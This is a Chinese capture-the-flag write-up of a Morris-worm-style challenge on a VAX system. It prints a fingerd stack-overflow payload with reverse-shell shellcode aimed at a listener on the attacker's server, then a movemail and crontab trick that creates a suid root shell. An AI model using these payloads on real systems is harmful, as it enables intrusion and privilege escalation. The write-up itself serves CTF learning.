# 1988

*Welcome to 1988, please read README.md carefully*

用上了vax780的远古老题，并给出了详细的wp，以下是我粗略的解释

## 解题思路

首先利用`fingerd`的`gets`打栈溢出，执行任意shellcode，作者写的是反弹shell

> 没有服务器，frp还配不好，紧急借了台服务器

然后`movemail`设有suid位，通过修改定时任务达到rce的目的，创建一个有suid位的`sh`，
接着`cat /flag`即可

## EXPLOIT

**Command on remote server** :
```sh
nc -lvvp 4444
```

**Command on local machine** :
```sh
perl -e 'print "\x01"x303 . "\xdd\x00\xdd\x01\xdd\x02\xdd\x03\xd0\x5e\x5c\xbc\x8f\x61\x00\xd0\x50\x5a\xdd\x00\xdd\x00\xdd\x8f{YOUR REMOTE SERVER IP}\xdd\x8f\x02\x00\x11\x5c\xd0\x5e\x5b\xdd\x10\xdd\x5b\xdd\x5a\xdd\x03\xd0\x5e\x5c\xbc\x8f\x62\x00\xd0\x00\x5b\xdd\x5b\xdd\x5a\xdd\x02\xd0\x5e\x5c\xbc\x8f\x5a\x00\xf3\x02\x5b\xef\xdd\x8f\x2f\x73\x68\x00\xdd\x8f\x2f\x62\x69\x6e\xd0\x5e\x5b\xdd\x00\xdd\x00\xdd\x5b\xdd\x03\xd0\x5e\x5c\xbc\x3b" . "A"x109 . "\x00"x16 . "\x38\xea\xff\x7f"' | ncat -v $TARGET_IP 79
```
注意用自己服务器的ip替换`{YOUR REMOTE SERVER IP}`字段，保持字节的表达形式

**Commands on remote server** :
```sh
(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)
ls -l /usr/lib/crontab.local
(echo "* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh"; echo  "* * * * * root rm -f /usr/lib/crontab.local") > /usr/lib/crontab.local
cat /usr/lib/crontab.local
```
稍等一会儿等待定时任务执行
```sh
ls -l /tmp/sh
/tmp/sh
cat /flag
```

成功拿到flag

## 后记

docker起不了，本地的环境久久无法正常工作，于是我决定直接打远程，所幸数据和原文都对的上，
作者给的脚本不需要多少修改就可以直接打通

同时这道题是对pwn一词的诠释，让我第一次见到了二进制利用在现实中的应用

## 参考文献

[解题所需的blog](https://www.rapid7.com/blog/post/2019/01/02/the-ghost-of-exploits-past-a-deep-dive-into-the-morris-worm/)
